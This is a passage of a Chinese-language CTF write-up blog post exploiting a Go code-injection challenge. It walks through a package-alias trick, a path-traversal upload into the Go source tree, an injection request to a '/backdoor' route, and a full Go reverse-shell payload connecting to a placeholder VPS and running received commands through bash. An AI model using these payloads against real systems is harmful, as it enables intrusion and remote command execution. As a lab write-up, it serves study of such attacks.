+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"> fmt <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Good&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于给导入的包设置一个别名,所以可以将我们自己的包设置别名为fmt，从而执行任意代码</p>
+<p>自己建立的包</p>
+<p><code>PrintLn.go</code></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> v2i</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Println</span><span class="params">(a <span class="type">string</span>)</span></span>&#123;</span><br><span class="line">	_=a</span><br><span class="line">	cmd:=exec.Command(<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">	out,_:=cmd.CombinedOutput()</span><br><span class="line">	fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将文件压缩，然后上传，解压到<code>/usr/local/go/src/v2i</code></p>
+<p>路径在报错里看到</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191647878.png" title="image-20230219164700793" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191647878.png" alt="image-20230219164700793"></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/unzip?path=../../../../usr/local/go/src/v2i</span><br></pre></td></tr></table></figure>
+
+<p>然后在<code>/backdoor</code>路由</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/backdoor?pkg=<span class="built_in">fmt</span> v2i</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191648789.png" title="image-20230219164845696" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191648789.png" alt="image-20230219164845696"></a></p>
+<p>这样就执行了我们的代码，但是有点麻烦，得不断上传解压缩</p>
+<p>但也可以试试反弹shell，如果要反弹shell的话，自己建的包就得是【从网上抄的代码XD】</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> v2i</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	cmd <span class="type">string</span></span><br><span class="line">	line <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Println</span><span class="params">(a <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	_=a</span><br><span class="line">	addr := <span class="string">&quot;vpsip:9999&quot;</span> <span class="comment">//远程连接主机名</span></span><br><span class="line">	conn,err := net.Dial(<span class="string">&quot;tcp&quot;</span>,addr) <span class="comment">//拨号操作，用于连接服务端，需要指定协议。</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>,<span class="number">10240</span>) <span class="comment">//定义一个切片的长度是10240。</span></span><br><span class="line">	<span class="keyword">for</span>  &#123;</span><br><span class="line">		n,err := conn.Read(buf) <span class="comment">//接受的命令</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != io.EOF &#123;  <span class="comment">//io.EOF在网络编程中表示对端把链接关闭了。</span></span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		cmd_str := <span class="type">string</span>(buf[:n])</span><br><span class="line">		cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,cmd_str) <span class="comment">//命令执行</span></span><br><span class="line">		stdout, err := cmd.StdoutPipe()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> stdout.Close()</span><br><span class="line">		<span class="keyword">if</span> err := cmd.Start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">		opBytes, err := ioutil.ReadAll(stdout)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">		conn.Write([]<span class="type">byte</span>(opBytes)) <span class="comment">//返回执行结果</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用相同的方式执行，就可以在vps上获得shell</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191655597.png" title="image-20230219165545537" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191655597.png" alt="image-20230219165545537"></a></p>
+<h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#undefined">goeval代码注入导致远程代码执行(2022虎符Final)</a></li>
+</ul>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/nodejs/'>
+                            nodejs
+                        </a>
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                        <a href='/tags/CTF/'>
+                            CTF
+                        </a>
+                    
+                        <a href='/tags/go/'>
+                            go
+                        </a>
+                    
+                        <a href='/tags/rust/'>
+                            rust
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/WP/'>
+                            WP
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
